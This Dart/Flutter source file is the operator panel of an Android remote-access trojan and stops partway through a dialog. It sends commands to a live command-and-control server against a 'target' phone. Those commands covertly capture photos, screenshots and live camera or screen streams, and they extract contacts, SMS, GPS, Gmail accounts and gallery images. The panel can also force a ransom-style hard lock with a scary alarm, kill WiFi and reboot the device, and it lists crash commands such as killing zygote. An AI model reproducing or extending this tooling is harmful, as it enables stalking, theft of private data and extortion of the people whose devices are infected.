import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — NEON BLUE MODERN THEME
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  // ─── NEON BLUE THEME ───
  static const Color bg = Color(0xFF060B18);
  static const Color bgCard = Color(0xFF0D1A2D);
  static const Color bgCardHover = Color(0xFF142A42);
  static const Color borderColor = Color(0xFF1A3A5A);
  static const Color primary = Color(0xFF00D4FF);
  static const Color primaryDark = Color(0xFF0099CC);
  static const Color primaryLight = Color(0xFF66E8FF);
  static const Color textPrimary = Color(0xFFF0F8FF);
  static const Color textSecondary = Color(0xFF8AB4D6);
  static const Color textMuted = Color(0xFF4A6A8A);
  static const Color success = Color(0xFF00E676);
  static const Color warning = Color(0xFFFFD54F);
  static const Color danger = Color(0xFFFF5252);
  static const Color purple = Color(0xFF7C4DFF);
  static const Color orange = Color(0xFFFFAB40);
  static const Color teal = Color(0xFF1DE9B6);
  static const Color pink = Color(0xFFFF4081);

  // ─── STATE ───
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // Animation
  late AnimationController _pulseController;
  late AnimationController _glowController;
  late Animation<double> _glowAnim;

  // ─── INFO ───
  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    
    _pulseController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);
    
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 0.8).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );
    
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    _pulseController.dispose();
    _glowController.dispose();
    super.dispose();
  }

  // ─── HELPERS ───
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = primary}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c,
      content: Text(m, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13, color: Colors.white)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
    ));
  }

  // ─── SEND COMMAND ───
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('Invalid target ID');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('https://eghatzy.rexypediaa.my.id:25565/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('✓ $cmd');
          _toast('Command sent!', c: success);
        }
        if (cmd == 'take_photo' || cmd == 'get_screen' || cmd == 'get_location' ||
            cmd == 'track_gps' || cmd == 'get_contacts' || cmd == 'dump_contacts' ||
            cmd == 'get_gmails' || cmd == 'get_sms' || cmd == 'get_gallery') {
          _poll(cmd);
        }
      } else {
        if (!silent) {
          _addLog('✗ $cmd failed');
          _toast('Device offline', c: danger);
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('✗ Connection error');
        _toast('Connection failed', c: danger);
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─── POLL RESPONSE ───
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      try {
        final res = await http.get(
          Uri.parse('https://eghatzy.rexypediaa.my.id:25565/api/get-response/$_id')
        ).timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('⏱️ Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    try {
      switch (cmd) {
        case 'take_photo':
          final b = d['image_base64']?.toString() ?? '';
          if (b.isNotEmpty) {
            _addLog('📸 Photo received');
            _imgDialog(b, '📸 Target Photo');
          }
          break;
        case 'get_screen':
          final b = d['image_base64']?.toString() ?? '';
          if (b.isNotEmpty) {
            _addLog('🖥️ Screenshot received');
            _imgDialog(b, '🖥️ Screenshot');
          }
          break;
        case 'get_location':
        case 'track_gps':
          _addLog('📍 GPS received');
          _locationDialog(d['lat'], d['lng']);
          break;
        case 'get_contacts':
        case 'dump_contacts':
          final l = d['contacts'] as List? ?? [];
          _addLog('👤 ${l.length} contacts');
          _contactsSheet(l);
          break;
        case 'get_gmails':
          _addLog('📧 Accounts received');
          _textDialog('📧 Accounts', d['accounts']?.toString() ?? '-');
          break;
        case 'get_sms':
          final s = d['sms'] as List? ?? [];
          _addLog('💬 ${s.length} SMS');
          _smsSheet(s);
          break;
        case 'get_gallery':
          final imgs = d['images'] as List? ?? [];
          _addLog('🖼️ ${imgs.length} images');
          _gallerySheet(imgs);
          break;
      }
    } catch (e) {
      _addLog('⚠️ Error processing response');
    }
  }

  // ─── LIVE STREAM ───
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra, silent: true);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? '📷 FRONT' : '📷 BACK')
          : '🖥️ SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http.get(
          Uri.parse('https://eghatzy.rexypediaa.my.id:25565/api/live-frame/$_id')
        ).timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() {
      _liveOn = false;
      _frame = null;
    });
    _cmd('live_stop', silent: true);
    _addLog('⏹️ Live stopped');
  }

  // ─── CHAT ───
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('https://eghatzy.rexypediaa.my.id:25565/api/lock-chat-all/$_id')
      ).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? ''
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
      'from': 'owner',
      'text': text.trim(),
      'time': TimeOfDay.now().format(context)
    }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('https://eghatzy.rexypediaa.my.id:25565/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ─── BUILD ───
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bg,
      appBar: _buildAppBar(),
      body: Column(
        children: [
          _buildLogBar(),
          Expanded(
            child: TabBarView(
              controller: _tabs,
              children: [
                _pageLive(),
                _pageCamera(),
                _pageIntel(),
                _pageAudio(),
                _pageLock(),
                _pageDevice(),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── APP BAR (FIXED) ───
  PreferredSizeWidget _buildAppBar() {
    return PreferredSize(
      preferredSize: const Size.fromHeight(120),
      child: Container(
        padding: const EdgeInsets.fromLTRB(8, 40, 8, 8),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgCard, bg],
          ),
          border: Border(bottom: BorderSide(color: primary.withOpacity(0.1))),
        ),
        child: Column(
          children: [
            Row(
              children: [
                IconButton(
                  icon: const Icon(Icons.arrow_back_ios_new, color: textPrimary, size: 18),
                  onPressed: () {
                    if (_liveOn) _stopLive();
                    Navigator.pop(context);
                  },
                ),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _model,
                        style: TextStyle(
                          color: textPrimary,
                          fontSize: 16,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 0.5,
                        ),
                      ),
                      Row(
                        children: [
                          AnimatedContainer(
                            duration: const Duration(milliseconds: 800),
                            width: 6,
                            height: 6,
                            decoration: BoxDecoration(
                              color: _liveOn ? primary : textMuted,
                              shape: BoxShape.circle,
                              boxShadow: _liveOn ? [
                                BoxShadow(
                                  color: primary.withOpacity(0.6),
                                  blurRadius: 8,
                                ),
                              ] : [],
                            ),
                          ),
                          const SizedBox(width: 6),
                          Text(
                            'Battery: $_battery%  •  $_id',
                            style: TextStyle(
                              color: textSecondary,
                              fontSize: 10,
                            ),
                            overflow: TextOverflow.ellipsis,
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
                if (_liveOn)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                    decoration: BoxDecoration(
                      color: primary.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(color: primary.withOpacity(0.3)),
                    ),
                    child: Row(
                      children: [
                        Container(
                          width: 6,
                          height: 6,
                          decoration: BoxDecoration(
                            color: primary,
                            shape: BoxShape.circle,
                            boxShadow: [
                              BoxShadow(
                                color: primary.withOpacity(0.6),
                                blurRadius: 8,
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(width: 4),
                        Text(
                          '$_fps FPS',
                          style: TextStyle(
                            color: primary,
                            fontSize: 10,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ],
                    ),
                  ),
                if (_sending)
                  Padding(
                    padding: const EdgeInsets.only(left: 8),
                    child: SizedBox(
                      width: 16,
                      height: 16,
                      child: CircularProgressIndicator(
                        strokeWidth: 2,
                        color: primary,
                      ),
                    ),
                  ),
                IconButton(
                  icon: Icon(Icons.refresh_rounded, color: textMuted, size: 20),
                  onPressed: () {
                    setState(() {});
                    _cmd('force_open', silent: true);
                  },
                ),
              ],
            ),
            const SizedBox(height: 8),
            _buildTabBar(),
          ],
        ),
      ),
    );
  }

  // ─── TAB BAR ───
  Widget _buildTabBar() {
    return Container(
      height: 44,
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: borderColor.withOpacity(0.3)),
      ),
      child: TabBar(
        controller: _tabs,
        isScrollable: true,
        indicator: BoxDecoration(
          gradient: LinearGradient(colors: [primary, primaryDark]),
          borderRadius: BorderRadius.circular(10),
        ),
        indicatorSize: TabBarIndicatorSize.tab,
        indicatorPadding: const EdgeInsets.symmetric(horizontal: 2, vertical: 2),
        labelColor: Colors.white,
        unselectedLabelColor: textMuted,
        labelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.w600),
        tabs: const [
          Tab(icon: Icon(Icons.live_tv, size: 16), text: 'Live'),
          Tab(icon: Icon(Icons.camera_alt, size: 16), text: 'Camera'),
          Tab(icon: Icon(Icons.psychology, size: 16), text: 'Intel'),
          Tab(icon: Icon(Icons.audiotrack, size: 16), text: 'Audio'),
          Tab(icon: Icon(Icons.lock, size: 16), text: 'Lock'),
          Tab(icon: Icon(Icons.devices, size: 16), text: 'Device'),
        ],
      ),
    );
  }

  // ─── LOG BAR ───
  Widget _buildLogBar() {
    return Container(
      height: 42,
      margin: const EdgeInsets.fromLTRB(12, 8, 12, 0),
      padding: const EdgeInsets.symmetric(horizontal: 14),
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: borderColor.withOpacity(0.3)),
      ),
      child: _log.isEmpty
          ? Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  width: 6,
                  height: 6,
                  decoration: BoxDecoration(
                    color: success,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: success.withOpacity(0.6),
                        blurRadius: 4,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 8),
                Text(
                  'System ready',
                  style: TextStyle(color: textSecondary, fontSize: 10),
                ),
              ],
            )
          : ListView.builder(
              itemCount: _log.length,
              reverse: true,
              itemBuilder: (_, i) => Text(
                _log[i],
                style: TextStyle(
                  color: textSecondary,
                  fontSize: 9,
                  fontFamily: 'monospace',
                ),
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
            ),
    );
  }

  // ─── PAGE: LIVE ───
  Widget _pageLive() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildSectionHeader('📡 Live Stream', 'Real-time monitoring'),
        const SizedBox(height: 12),
        _buildLiveViewer(),
        const SizedBox(height: 12),
        Row(
          children: [
            Expanded(
              child: _buildActionButton(
                'Camera',
                primary,
                Icons.videocam_rounded,
                () => _showCamPicker((side) {
                  _startLive('live_camera_start', side);
                  _showLiveDialog();
                }),
              ),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: _buildActionButton(
                'Screen',
                teal,
                Icons.desktop_windows_rounded,
                () {
                  _startLive('live_screen_start', '');
                  _showLiveDialog();
                },
              ),
            ),
          ],
        ),
        if (_liveOn) ...[
          const SizedBox(height: 10),
          _buildActionButton('⏹ Stop Live', danger, Icons.stop_rounded, _stopLive),
        ],
      ],
    );
  }

  Widget _buildLiveViewer() {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      height: _liveOn ? 220 : 90,
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: _liveOn ? primary.withOpacity(0.4) : borderColor.withOpacity(0.3),
        ),
        boxShadow: _liveOn ? [
          BoxShadow(
            color: primary.withOpacity(0.08),
            blurRadius: 30,
          ),
        ] : [],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(13),
        child: _liveOn && _frame != null
            ? Image.memory(
                _frame!,
                fit: BoxFit.contain,
                gaplessPlayback: true,
                filterQuality: FilterQuality.low,
              )
            : Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(
                      _liveOn ? Icons.hourglass_empty : Icons.videocam_off,
                      color: textMuted,
                      size: 32,
                    ),
                    const SizedBox(height: 8),
                    Text(
                      _liveOn ? 'Waiting for frame...' : 'Stream inactive',
                      style: TextStyle(color: textSecondary, fontSize: 11),
                    ),
                  ],
                ),
              ),
      ),
    );
  }

  // ─── PAGE: CAMERA ───
  Widget _pageCamera() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildSectionHeader('📸 Camera & Visual', 'Capture and visual control'),
        const SizedBox(height: 12),
        _buildActionButton('📷 Take Photo', primary, Icons.camera_alt_rounded,
            () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
        const SizedBox(height: 10),
        _buildActionButton('🖥️ Screenshot', teal, Icons.screenshot_monitor,
            () => _cmd('get_screen')),
        const SizedBox(height: 10),
        _buildActionButton('🖼️ Set Wallpaper', purple, Icons.wallpaper_rounded,
            () => _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))),
        const SizedBox(height: 10),
        Row(
          children: [
            Expanded(
              child: _buildActionButton('💡 Flash ON', orange, Icons.flash_on_rounded,
                  () => _cmd('flash_strobe')),
            ),
            const SizedBox(width: 10),
            Expanded(
              child: _buildActionButton('🚫 Flash OFF', textMuted, Icons.flash_off_rounded,
                  () => _cmd('stop_strobe')),
            ),
          ],
        ),
      ],
    );
  }

  // ─── PAGE: INTEL ───
  Widget _pageIntel() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildSectionHeader('🧠 Intelligence', 'Extract target data'),
        const SizedBox(height: 12),
        _buildActionButton('👤 Contacts', primary, Icons.contacts_rounded,
            () => _cmd('get_contacts')),
        const SizedBox(height: 10),
        _buildActionButton('📍 GPS Location', success, Icons.my_location_rounded,
            () => _cmd('get_location')),
        const SizedBox(height: 10),
        _buildActionButton('📧 Gmail Accounts', primaryLight, Icons.account_circle_rounded,
            () => _cmd('get_gmails')),
        const SizedBox(height: 10),
        _buildActionButton('💬 SMS Inbox', teal, Icons.sms_rounded,
            () => _cmd('get_sms')),
        const SizedBox(height: 10),
        _buildActionButton('🔔 Notifications', orange, Icons.notifications_rounded,
            () => _fetchNotif()),
        const SizedBox(height: 10),
        _buildActionButton('🖼️ Gallery (5)', pink, Icons.photo_library_rounded,
            () => _cmd('get_gallery', extra: '5')),
        const SizedBox(height: 10),
        _buildActionButton('🔓 Notification Access', purple, Icons.security_rounded,
            () => _cmd('open_notification_settings')),
      ],
    );
  }

  // ─── PAGE: AUDIO ───
  Widget _pageAudio() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildSectionHeader('🎵 Audio & Network', 'Audio and network control'),
        const SizedBox(height: 12),
        _buildActionButton('▶️ Play Audio', primary, Icons.play_circle_rounded,
            () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
        const SizedBox(height: 10),
        _buildActionButton('⏹️ Stop Audio', textMuted, Icons.stop_circle_rounded,
            () => _cmd('stop_audio')),
        const SizedBox(height: 10),
        _buildActionButton('📳 Vibrate Loop', purple, Icons.vibration_rounded,
            () => _cmd('vibrate_loop')),
        const SizedBox(height: 10),
        _buildActionButton('🌐 Open URL', teal, Icons.open_in_browser,
            () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))),
        const SizedBox(height: 10),
        _buildActionButton('📶 Kill WiFi', orange, Icons.wifi_off_rounded,
            () => _cmd('kill_wifi')),
      ],
    );
  }

  // ─── PAGE: LOCK ───
  Widget _pageLock() {
    return Column(
      children: [
        Expanded(
          child: ListView(
            padding: const EdgeInsets.all(16),
            children: [
              _buildSectionHeader('🔒 Lock Screen', 'Full control over target lock'),
              const SizedBox(height: 12),
              _buildActionButton('🔐 Custom Lock', primary, Icons.lock_rounded, () {
                _showLockDialog();
              }),
              const SizedBox(height: 10),
              _buildActionButton('⚡ Quick Lock', orange, Icons.lock_outline_rounded, () {
                _cmd('hard_lock', extra: '🔴 DEVICE LOCKED|1234||1|1|1|1');
                _toast('✅ Quick lock sent!', c: orange);
              }),
              const SizedBox(height: 10),
              _buildActionButton('🔓 Unlock', success, Icons.lock_open_rounded,
                  () => _cmd('unlock')),
              const SizedBox(height: 20),
              _buildSectionHeader('💬 Chat with Target', 'Messages appear on lock screen'),
              const SizedBox(height: 10),
              _buildChatView(),
            ],
          ),
        ),
        _buildChatInput(),
      ],
    );
  }

  Widget _buildChatView() {
    return Container(
      height: 180,
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: borderColor.withOpacity(0.3)),
      ),
      child: _chat.isEmpty
          ? Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(Icons.chat_bubble_outline, color: textMuted.withOpacity(0.3), size: 40),
                  const SizedBox(height: 8),
                  Text('No messages yet', style: TextStyle(color: textSecondary, fontSize: 11)),
                ],
              ),
            )
          : ListView.builder(
              controller: _chatScroll,
              padding: const EdgeInsets.all(10),
              reverse: false,
              itemCount: _chat.length,
              itemBuilder: (_, i) {
                final m = _chat[i];
                final isOwner = m['from'] == 'owner';
                return Padding(
                  padding: const EdgeInsets.symmetric(vertical: 3),
                  child: Row(
                    mainAxisAlignment: isOwner ? MainAxisAlignment.end : MainAxisAlignment.start,
                    children: [
                      Container(
                        constraints: BoxConstraints(
                          maxWidth: MediaQuery.of(context).size.width * 0.65,
                        ),
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            colors: isOwner
                                ? [primary, primaryDark]
                                : [bgCardHover, borderColor.withOpacity(0.5)],
                          ),
                          borderRadius: BorderRadius.circular(12),
                          boxShadow: isOwner ? [
                            BoxShadow(
                              color: primary.withOpacity(0.2),
                              blurRadius: 8,
                            ),
                          ] : [],
                        ),
                        child: Column(
                          crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start,
                          children: [
                            Text(
                              m['text'] ?? '',
                              style: TextStyle(
                                color: isOwner ? textPrimary : textSecondary,
                                fontSize: 12,
                              ),
                            ),
                            const SizedBox(height: 2),
                            Text(
                              m['time'] ?? '',
                              style: const TextStyle(
                                color: textMuted,
                                fontSize: 8,
                                fontWeight: FontWeight.w300,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                );
              },
            ),
    );
  }

  Widget _buildChatInput() {
    return Container(
      padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
      decoration: BoxDecoration(
        color: bgCard,
        border: Border(top: BorderSide(color: borderColor.withOpacity(0.3))),
      ),
      child: Row(
        children: [
          Expanded(
            child: TextField(
              controller: _chatCtrl,
              style: const TextStyle(color: textPrimary, fontSize: 13),
              decoration: InputDecoration(
                hintText: 'Type message...',
                hintStyle: const TextStyle(color: textMuted, fontSize: 12),
                filled: true,
                fillColor: bg,
                contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(24),
                  borderSide: BorderSide.none,
                ),
                prefixIcon: Icon(Icons.chat, color: textMuted, size: 18),
              ),
              onSubmitted: _sendChat,
            ),
          ),
          const SizedBox(width: 8),
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (context, child) {
              return GestureDetector(
                onTap: () => _sendChat(_chatCtrl.text),
                child: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [primary, primaryDark]),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: primary.withOpacity(_glowAnim.value),
                        blurRadius: 12,
                      ),
                    ],
                  ),
                  child: const Icon(Icons.send_rounded, color: Colors.white, size: 16),
                ),
              );
            },
          ),
        ],
      ),
    );
  }

  // ─── PAGE: DEVICE ───
  Widget _pageDevice() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _buildSectionHeader('⚙️ Device Control', 'System management'),
        const SizedBox(height: 12),
        _buildActionButton('🔄 Restart Device', orange, Icons.restart_alt_rounded, () {
          _showRestartDialog();
        }),
        const SizedBox(height: 10),
        _buildActionButton('☀️ Wake Target', success, Icons.wb_sunny_rounded,
            () => _cmd('force_open')),
        const SizedBox(height: 20),
        _buildInfoCard(),
      ],
    );
  }

  Widget _buildInfoCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: borderColor.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.info_outline, color: primary, size: 16),
              const SizedBox(width: 8),
              Text(
                'Restart Methods',
                style: TextStyle(
                  color: textPrimary,
                  fontSize: 12,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          _buildInfoRow('1', 'PowerManager reflection (no root)'),
          _buildInfoRow('2', 'DevicePolicyManager (admin)'),
          _buildInfoRow('3', 'su -c reboot (root)'),
          _buildInfoRow('4', 'am crash system_server'),
          _buildInfoRow('5', 'pkill -9 zygote'),
        ],
      ),
    );
  }

  // ─── DIALOGS ───

  void _showRestartDialog() {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
        title: Row(
          children: [
            Icon(Icons.warning_rounded, color: orange),
            const SizedBox(width: 8),
            const Text('Restart Device', style: TextStyle(color: textPrimary, fontSize: 15, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Text(
          'Target device will be restarted.\n\nUsing PowerManager reflection — no root required.',
          style: TextStyle(color: textSecondary, fontSize: 13, height: 1.5),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Cancel', style: TextStyle(color: textMuted)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: orange,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () {
              Navigator.pop(context);
              _cmd('reboot_device');
            },
            child: const Text('Restart', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showLockDialog() {
    final msgCtrl = TextEditingController(text: '🔴 DEVICE LOCKED');
    final pinCtrl = TextEditingController(text: '1234');
    final chatCtrl = TextEditingController();
    final soundCtrl = TextEditingController();

    bool withSound = true;
    bool withFlash = true;
    bool withVibrate = true;
    bool withHardLock = true;
    bool withChat = false;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => StatefulBuilder(
        builder: (ctx, setState) {
          return AlertDialog(
            backgroundColor: bgCard,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
            title: Row(
              children: [
                Icon(Icons.lock_rounded, color: primary, size: 22),
                const SizedBox(width: 8),
                const Text('Custom Lock', style: TextStyle(color: textPrimary, fontSize: 16, fontWeight: FontWeight.bold)),
              ],
            ),
            content: Container(
              width: MediaQuery.of(context).size.width * 0.85,
              constraints: BoxConstraints(
                maxHeight: MediaQuery.of(context).size.height * 0.7,
              ),
              child: SingleChildScrollView(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    _buildTextField(msgCtrl, 'Lock Message', hint: '🔴 DEVICE LOCKED'),
                    const SizedBox(height: 10),
                    _buildTextField(pinCtrl, 'PIN (4 digit)', hint: '1234', isNum: true),
                    const SizedBox(height: 10),
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: bg,
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: borderColor.withOpacity(0.3)),
                      ),
                      child: Row(
                        children: [
                          Icon(Icons.info_outline, color: primary, size: 16),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              'Hard Lock blocks system buttons (Back/Home/Recent).\nPIN still works to unlock.',
                              style: TextStyle(color: textSecondary, fontSize: 10, height: 1.3),
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 10),
                    Container(height: 1, color: borderColor.withOpacity(0.3), margin: const EdgeInsets.symmetric(vertical: 4)),
                    const Text('Features:', style: TextStyle(color: textPrimary, fontSize: 13, fontWeight: FontWeight.w600)),
                    const SizedBox(height: 8),
                    _buildCheckbox(
                      value: withSound,
                      onChanged: (val) => setState(() => withSound = val!),
                      label: '🔊 Scary Sound',
                      subtitle: 'Alarm at full volume',
                      color: orange,
                    ),
                    _buildCheckbox(
                      value: withFlash,
                      onChanged: (val) => setState(() => withFlash = val!),
                      label: '💡 Flash',
                      subtitle: 'Strobe flash',
                      color: teal,
                    ),
                    _buildCheckbox(
                      value: withVibrate,
                      onChanged: (val) => setState(() => withVibrate = val!),
                      label: '📳 Vibrate',
                      subtitle: 'Continuous vibration',
                      color: purple,
                    ),
                    _buildCheckbox(
                      value: withHardLock,
                      onChanged: (val) => setState(() => withHardLock = val!),
                      label: '🔒 Hard Lock',
